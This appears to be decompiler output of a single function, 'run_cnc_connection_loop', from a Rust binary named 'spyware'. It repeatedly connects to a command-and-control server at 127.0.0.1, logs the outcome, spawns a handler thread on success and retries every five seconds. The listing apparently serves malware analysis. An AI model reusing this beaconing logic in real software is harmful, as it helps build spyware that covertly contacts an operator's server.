fn spyware::run_cnc_connection_loop() -> void {
    let v0: u32;  // [bp-0x114]
    let v1: void*;  // [bp-0x110], Other Possible Types: core::result::Result<core::net::socket_addr::SocketAddr, std::io::error::Error>, struct32, struct40, u64
    let v2: struct64;  // [bp-0x108], Other Possible Types: u64
    let v3: i64;  // [bp-0x100], Other Possible Types: u64
    let v4: u64;  // [bp-0xf8]
    let v5: core::fmt::Arguments;  // [bp-0xf0], Other Possible Types: void*
    let v6: u8;  // [bp-0xe8]
    let v7: struct32;  // [bp-0xe0], Other Possible Types: struct40, u64
    let v8: u64;  // [bp-0xe0]
    let v9: u64;  // [bp-0xd8]
    let v10: u64;  // [bp-0xd0]
    let v11: u64;  // [bp-0xc8]
    let v12: core::fmt::Arguments;  // [bp-0xb8], Other Possible Types: struct64
    let v13: struct40;  // [bp-0xb0]
    let v14: Result<struct4, struct8>;  // [bp-0xa8]
    let v15: u32;  // [bp-0xa4]
    let v16: u64;  // [bp-0xa0]
    let v17: i64;  // [bp-0x98]
    let v18: struct32;  // [bp-0x98]
    let v19: u64;  // [bp-0x90]
    let v20: i64;  // [bp-0x88]
    let v21: u64;  // [bp-0x80]
    let v22: struct24;  // [bp-0x78]
    let v23: alloc::string::String;  // [bp-0x60]
    let v24: struct24;  // [bp-0x60]
    let v25: Result<struct48, struct13>;  // [bp-0x48]
    let v26: struct24;  // [bp-0x48]
    let v27: u64;  // [bp-0x30]
    let v28: u64;  // [bp-0x28]
    let v29: u64;  // [bp-0x20]
    let v30: u64;  // [bp-0x18]
    let v31: u64;  // [bp-0x10]
    let v33: u64;  // r15
    let v34: u64;  // r14
    let v35: u64;  // r13
    let v36: u64;  // r12
    let v37: u64;  // rbx
    let v38: u64;  // rdx
    let v39: u64;  // rcx
    let v40: u64;  // r8

    v31 = v33;
    v30 = v34;
    v29 = v35;
    v28 = v36;
    v27 = v37;
    loop {
        v7 = "127.0.0.1";
        v9 = <&T as core::fmt::Display>::fmt;
        v10 = &g_41281a;
        v11 = core::fmt::num::imp::<impl core::fmt::Display for u16>::fmt;
        v1 = &g_4b9348;
        v2 = 2;
        v5 = 0;
        v3 = &v7;
        v4 = 2;
        v23 = core::option::Option<T>::map_or_else(&v1, v38, v39, v40);
        v22 = v24;
        v14 = std::net::tcp::TcpStream::connect(&v22);
        match v14 {
            Err(v12) => {
                if core::sync::atomic::atomic_load() {
                    v25 = &v22;
                    v17 = &v25;
                    v19 = <&T as core::fmt::Display>::fmt;
                    v20 = &v12;
                    v21 = <std::io::error::Error as core::fmt::Display>::fmt;
                    v1 = "Failed to connect to cnc server (";
                    v2 = 2;
                    v5 = 0;
                    v3 = &v17;
                    v4 = 2;
                    v7 = struct40 {
                        field_0: "spyware"
                        field_16: "spyware"
                        field_32: log::__private_api::loc("src/main.rs")
                    };
                    log::__private_api::log(&v1, 1, &v7);
                }
            },
            Ok(v0) => {
                v7 = v7;
                if core::sync::atomic::atomic_load() >= 3 {
                    v1 = std::net::tcp::TcpStream::peer_addr(&v0);
                    v18 = core::result::Result<T,E>::unwrap(&v1);
                    v26 = <T as alloc::string::SpecToString>::spec_to_string(&v18);
                    v12 = &v26;
                    v13 = <alloc::string::String as core::fmt::Display>::fmt;
                    v1 = "Successfully connected to cnc server ";
                    v2 = 2;
                    v5 = 0;
                    v3 = &v12;
                    v4 = 1;
                    v7 = struct40 {
                        field_0: "spyware"
                        field_16: "spyware"
                        field_32: log::__private_api::loc("src/main.rs")
                    };
                    log::__private_api::log(&v1, 3, &v7);
                    v7 = v8;
                }
                v3 = 0x8000000000000000;
                v1 = 0;
                v6 = 0;
                std::thread::Builder::spawn_unchecked(&v7, &v1, v0 as u64);
                v1 = core::result::Result<T,E>::expect(&v7);
            },
        }
        std::thread::sleep(5, 0);
    }
}
